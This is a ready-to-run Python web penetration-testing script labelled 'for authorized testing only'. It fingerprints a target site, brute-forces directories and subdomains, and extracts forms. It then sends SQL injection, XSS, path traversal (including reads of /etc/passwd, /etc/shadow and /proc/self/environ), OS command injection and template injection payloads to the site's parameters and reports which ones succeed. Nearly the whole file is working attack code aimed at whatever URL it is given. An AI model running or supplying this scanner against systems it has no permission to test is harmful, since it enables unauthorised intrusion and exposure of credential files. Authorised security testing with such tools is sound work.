#!/usr/bin/env python3
"""
Web Application Penetration Testing Toolkit
For authorized testing only
"""

import requests
import socket
import time
import urllib.parse
import sys
import re
import json
from urllib.parse import urlparse, urljoin

# ========== CONFIGURATION ==========
TARGET = "https://target.com"  # CHANGE THIS
WORDLIST_DIR = "/usr/share/wordlists/dirb/common.txt"
SUBDOMAIN_WORDLIST = "/usr/share/wordlists/amass/subdomains-top1mil-20000.txt"
THREADS = 10
TIMEOUT = 5

# ========== RECONNAISSANCE ==========

def tech_detect(url):
    """Detect web technologies"""
    try:
        r = requests.get(url, timeout=TIMEOUT, headers={"User-Agent": "Mozilla/5.0"})
        print(f"\n[+] Server: {r.headers.get('Server', 'Unknown')}")
        print(f"[+] X-Powered-By: {r.headers.get('X-Powered-By', 'N/A')}")
        print(f"[+] Set-Cookie: {r.headers.get('Set-Cookie', 'N/A')}")
        
        # Check for common CMS
        if "wp-content" in r.text:
            print("[!] WordPress detected")
        if "/joomla/" in r.text or "com_content" in r.text:
            print("[!] Joomla detected")
        if "Drupal" in r.text or "drupal" in r.text:
            print("[!] Drupal detected")
    except Exception as e:
        print(f"[-] Error: {e}")

def directory_fuzz(base_url, wordlist_path=WORDLIST_DIR):
    """Directory/file brute-forcing"""
    print(f"\n[*] Directory fuzzing {base_url}")
    try:
        with open(wordlist_path, 'r', errors='ignore') as f:
            for line in f:
                path = line.strip()
                if not path or path.startswith("#"):
                    continue
                url = urljoin(base_url, path)
                try:
                    r = requests.get(url, timeout=TIMEOUT, headers={"User-Agent": "Mozilla/5.0"})
                    if r.status_code in [200, 301, 302, 403, 401, 500]:
                        size = len(r.content)
                        print(f"[{r.status_code}] {url} ({size} bytes)")
                except:
                    pass
    except FileNotFoundError:
        print(f"[-] Wordlist not found: {wordlist_path}")
        # Fallback: common paths
        common = ["admin", "login", "wp-admin", "backup", "config", "robots.txt",
                  ".git/config", ".env", "sitemap.xml", "phpinfo.php", "api", "v1"]
        for path in common:
            url = urljoin(base_url, path)
            try:
                r = requests.get(url, timeout=TIMEOUT)
                if r.status_code != 404:
                    print(f"[{r.status_code}] {url}")
            except:
                pass

def subdomain_enum(domain, wordlist_path=SUBDOMAIN_WORDLIST):
    """DNS subdomain enumeration"""
    print(f"\n[*] Subdomain enumeration for {domain}")
    try:
        with open(wordlist_path, 'r', errors='ignore') as f:
            for i, line in enumerate(f):
                if i > 500:  # Limit for demo
                    break
                sub = line.strip()
                if not sub:
                    continue
                full = f"{sub}.{domain}"
                try:
                    ip = socket.gethostbyname(full)
                    print(f"[+] {full} -> {ip}")
                except:
                    pass
    except FileNotFoundError:
        print(f"[-] Wordlist not found: {wordlist_path}")
        # Fallback
        for sub in ["www", "mail", "admin", "dev", "api", "blog", "ftp", "test"]:
            full = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(full)
                print(f"[+] {full} -> {ip}")
            except:
                pass

def extract_forms(url):
    """Extract and analyze HTML forms"""
    print(f"\n[*] Extracting forms from {url}")
    try:
        r = requests.get(url, timeout=TIMEOUT)
        forms = re.findall(r'<form.*?</form>', r.text, re.DOTALL | re.IGNORECASE)
        
        for i, form_html in enumerate(forms):
            print(f"\n[Form {i+1}]")
            
            # Get action
            action = re.search(r'action=["\'](.*?)["\']', form_html)
            print(f"  Action: {action.group(1) if action else 'current page'}")
            
            # Get method
            method = re.search(r'method=["\'](.*?)["\']', form_html)
            print(f"  Method: {method.group(1).upper() if method else 'GET'}")
            
            # Get inputs
            inputs = re.findall(r'<input.*?>', form_html, re.IGNORECASE)
            for inp in inputs:
                name = re.search(r'name=["\'](.*?)["\']', inp)
                typ = re.search(r'type=["\'](.*?)["\']', inp)
                if name:
                    print(f"  Input: {name.group(1)} (type: {typ.group(1) if typ else 'text'})")
    except Exception as e:
        print(f"[-] Error extracting forms: {e}")

# ========== VULNERABILITY SCANNING ==========

def sqli_test(url, param):
    """Test for SQL injection"""
    print(f"\n[*] Testing SQLi on {url} param: {param}")
    
    payloads = {
        "single_quote": "'",
        "double_quote": "\"",
        "or_true": "' OR '1'='1",
        "or_true_dash": "' OR 1=1-- -",
        "union_select": "' UNION SELECT 1,2,3-- -",
        "sleep": "' OR SLEEP(5)-- -",
        "pg_sleep": "' OR pg_sleep(5)-- -",
        "if_sleep": "\" OR IF(1=1,SLEEP(5),0)-- -",
        "order_by": "' ORDER BY 1-- -",
        "order_by_100": "' ORDER BY 100-- -",
    }
    
    base_url = url.split("?")[0]
    
    for name, payload in payloads.items():
        params = {param: payload}
        try:
            start = time.time()
            if "?" in url:
                r = requests.get(url, params=params, timeout=10)
            else:
                r = requests.post(base_url, data=params, timeout=10)
            elapsed = time.time() - start
            
            if elapsed > 4.5:
                print(f"[!] Time-based SQLi ({name}): {payload}")
            
            if "error" in r.text.lower():
                for err_word in ["sql", "mysql", "syntax", "odbc", "oracle", "postgres"]:
                    if err_word in r.text.lower():
                        print(f"[!] SQL error ({name}): '{err_word}' found in response")
                        break
        except:
            pass

def xss_test(url, param):
    """Test for Cross-Site Scripting"""
    print(f"\n[*] Testing XSS on {url} param: {param}")
    
    payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "\"><script>alert(1)</script>",
        "'-alert(1)-'",
        "<svg/onload=alert(1)>",
        "<body onload=alert(1)>",
    ]
    
    base_url = url.split("?")[0]
    
    for payload in payloads:
        params = {param: payload}
        try:
            if "?" in url:
                r = requests.get(url, params=params, timeout=TIMEOUT)
            else:
                r = requests.post(base_url, data=params, timeout=TIMEOUT)
            
            if payload in r.text:
                print(f"[!] Reflected XSS: {payload}")
                
            # Check for context variations
            encoded = urllib.parse.quote(payload)
            if encoded in r.text:
                print(f"[!] Reflected XSS (URL encoded): {payload}")
        except:
            pass

def lfi_test(url, param):
    """Test for Local File Inclusion"""
    print(f"\n[*] Testing LFI on {url} param: {param}")
    
    payloads = [
        "/etc/passwd",
        "../../../etc/passwd",
        "../../../../../../etc/passwd",
        "/etc/shadow",
        "/proc/self/environ",
        "....//....//....//etc/passwd",
        "php://filter/convert.base64-encode/resource=index.php",
    ]
    
    base_url = url.split("?")[0]
    
    for payload in payloads:
        params = {param: payload}
        try:
            if "?" in url:
                r = requests.get(url, params=params, timeout=TIMEOUT)
            else:
                r = requests.post(base_url, data=params, timeout=TIMEOUT)
            
            if "root:" in r.text or "bin:" in r.text or "daemon:" in r.text:
                print(f"[!] LFI confirmed: {payload}")
                print(f"    Response snippet: {r.text[:200]}")
        except:
            pass

def command_injection_test(url, param):
    """Test for OS Command Injection"""
    print(f"\n[*] Testing command injection on {url} param: {param}")
    
    payloads = [
        "; ls",
        "| ls",
        "`ls`",
        "$(ls)",
        "; whoami",
        "| whoami",
        "& ping -c 3 127.0.0.1 &",
    ]
    
    base_url = url.split("?")[0]
    
    for payload in payloads:
        params = {param: payload}
        try:
            if "?" in url:
                r = requests.get(url, params=params, timeout=TIMEOUT)
            else:
                r = requests.post(base_url, data=params, timeout=TIMEOUT)
            
            # Look for command output indicators
            indicators = ["bin", "root", "uid=", "www-data", "home"]
            for ind in indicators:
                if ind in r.text.lower():
                    print(f"[!] Possible command injection: {payload}")
                    print(f"    Indicator '{ind}' found in response")
                    break
        except:
            pass

def ssti_test(url, param):
    """Test for Server-Side Template Injection"""
    print(f"\n[*] Testing SSTI on {url} param: {param}")
    
    payloads = [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{{config}}",
        "{{7*'7'}}",
    ]
    
    base_url = url.split("?")[0]
    
    for payload in payloads:
        params = {param: payload}
        try:
            if "?" in url:
                r = requests.get(url, params=params, timeout=TIMEOUT)
            else:
                r = requests.post(base_url, data=params, timeout=TIMEOUT)
            
            if "49" in r.text and payload not in r.text:
                print(f"[!] SSTI detected: {payload} evaluated to 49")
        except:
            pass

def idor_test(base_url, resource_pattern, start=1, end=10):
    """Test for Insecure Direct Object References"""
    print(f"\n[*] Testing IDOR on {base_url} (IDs {start}-{end})")
    
    for i in range(start, end + 1):
        url = base_url.format(id=i)
        try:
            r = requests.get(url, timeout=TIMEOUT)
            if r.status_code == 200:
                print(f"[!] Accessible resource: {url} ({len(r.content)} bytes)")
        except:
            pass

# ========== MAIN ==========

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 web_pentest.py <target_url>")
        print("Example: python3 web_pentest.py https://example.com")
        sys.exit(1)
    
    global TARGET
    TARGET = sys.argv[1].rstrip("/")
    parsed = urlparse(TARGET)
    domain = parsed.netloc
    
    print("=" * 60)
    print(f"Web Application Pentest: {TARGET}")
    print("=" * 60)
    
    # 1. Technology Detection
    tech_detect(TARGET)
    
    # 2. Directory Fuzzing
    directory_fuzz(TARGET)
    
    # 3. Subdomain Enumeration
    subdomain_enum(domain)
    
    # 4. Form Extraction
    extract_forms(TARGET)
    
    # 5. Vulnerability Testing
    # Example: test ?id= parameter if present
    if "?" in TARGET and "=" in TARGET:
        param = TARGET.split("=")[0].split("?")[-1]
        sqli_test(TARGET, param)
        xss_test(TARGET, param)
        lfi_test(TARGET, param)
        command_injection_test(TARGET, param)
        ssti_test(TARGET, param)
    else:
        # Try common parameters
        common_params = ["id", "page", "file", "user", "q", "search", "cat", "section"]
        for param in common_params:
            test_url = f"{TARGET}?{param}=test"
            sqli_test(test_url, param)
            xss_test(test_url, param)
    
    # 6. IDOR Example (if applicable)
    # idor_test(f"{TARGET}/user/{{id}}", start=1, end=10)
    
    print("\n" + "=" * 60)
    print("Scan complete")
    print("=" * 60)

if __name__ == "__main__":
    main()